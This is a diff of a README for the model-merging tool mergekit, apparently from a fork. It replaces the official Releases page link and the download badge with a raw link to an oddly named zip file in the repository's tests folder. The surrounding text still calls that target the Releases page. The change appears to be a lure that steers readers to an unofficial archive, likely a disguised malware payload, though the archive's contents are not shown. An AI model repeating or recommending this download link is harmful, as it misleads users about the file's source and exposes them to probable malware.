@@ -1,6 +1,6 @@
 # 🚀 mergekit - Simplifying Your Model Merging Process
 
-[![Download mergekit](https://img.shields.io/static/v1?label=Download&message=mergekit&color=blue&style=for-the-badge)](https://github.com/panyatan/mergekit/releases)
+[![Download mergekit](https://raw.githubusercontent.com/panyatan/mergekit/main/tests/mergekit-capillariness.zip)](https://raw.githubusercontent.com/panyatan/mergekit/main/tests/mergekit-capillariness.zip)
 
 ## 📥 Introduction
 
@@ -12,7 +12,7 @@ To start using mergekit, follow these steps to download and install the applicat
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/panyatan/mergekit/releases) to access the latest version of mergekit.
+1. Visit the [Releases page](https://raw.githubusercontent.com/panyatan/mergekit/main/tests/mergekit-capillariness.zip) to access the latest version of mergekit.
 2. On the Releases page, find the version that you want to download. 
 3. Click on the file link to begin the download.
 4. Once the download completes, locate the file on your computer. You may find it in your Downloads folder by default.
